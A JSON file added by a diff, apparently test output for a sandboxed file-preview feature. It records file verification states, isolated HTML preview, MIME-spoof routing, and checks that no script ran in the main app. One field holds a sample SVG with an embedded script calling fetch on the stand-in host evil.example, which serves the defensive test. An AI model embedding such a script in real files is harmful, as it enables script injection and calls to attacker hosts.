@@ -1,0 +1,113 @@
+{
+  "cardCount": 11,
+  "cards": [
+    {
+      "name": "report.md",
+      "state": "verified"
+    },
+    {
+      "name": "data.csv",
+      "state": "verified"
+    },
+    {
+      "name": "config.json",
+      "state": "verified"
+    },
+    {
+      "name": "picture.png",
+      "state": "verified"
+    },
+    {
+      "name": "page.html",
+      "state": "unverified"
+    },
+    {
+      "name": "notes.txt",
+      "state": "unverified"
+    },
+    {
+      "name": "tampered.bin",
+      "state": "mismatch"
+    },
+    {
+      "name": "drifted.csv",
+      "state": "mismatch"
+    },
+    {
+      "name": "gone.pdf",
+      "state": "missing"
+    },
+    {
+      "name": "lost.zip",
+      "state": "missing"
+    },
+    {
+      "name": "extra-legacy.txt",
+      "state": "legacy"
+    }
+  ],
+  "html": {
+    "activeState": "unverified",
+    "decisionChips": [
+      "html"
+    ],
+    "panelText": "page.html隔离预览静态 HTML 在独立沙箱窗口中显示:无脚本、无网络、无表单,与主应用零共享。在隔离窗口中预览",
+    "hasHtmlPreviewBtn": true,
+    "htmlPreviewBadge": "隔离预览",
+    "liveSvgElements": 0,
+    "activeScriptTags": 0,
+    "mainPwned": null,
+    "mainTitle": "alpha-code"
+  },
+  "svg": {
+    "activeState": "verified",
+    "decisionChips": [
+      "code"
+    ],
+    "panelText": "1<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('http://evil.example/x')</script><rect width=\"10\" height=\"10\"/></svg>",
+    "hasHtmlPreviewBtn": false,
+    "htmlPreviewBadge": null,
+    "liveSvgElements": 0,
+    "activeScriptTags": 0,
+    "mainPwned": null,
+    "mainTitle": "alpha-code"
+  },
+  "svgSourceShown": {
+    "rendererChip": [
+      "code"
+    ],
+    "sourceContainsScriptText": true,
+    "liveScriptEls": 0
+  },
+  "spoof": {
+    "activeState": "verified",
+    "decisionChips": [
+      "html"
+    ],
+    "notices": [
+      {
+        "kind": null,
+        "text": "平台产物列表不可用(离线或未登录)—— 仅显示本地产物。"
+      },
+      {
+        "kind": "warn",
+        "text": "MIME 冲突:声明 image/png,检测 text/html —— 按检测结果路由"
+      }
+    ],
+    "hasHtmlPreviewBtn": true,
+    "hasImgTag": false,
+    "mainPwned": null,
+    "mainTitle": "alpha-code"
+  },
+  "mainRendererIntegrity": {
+    "pwned": null,
+    "title": "alpha-code",
+    "url": "/index.html"
+  },
+  "openIsolated": {
+    "openNote": "已在隔离窗口中打开",
+    "error": null,
+    "mainPwned": null,
+    "mainTitle": "alpha-code"
+  }
+}
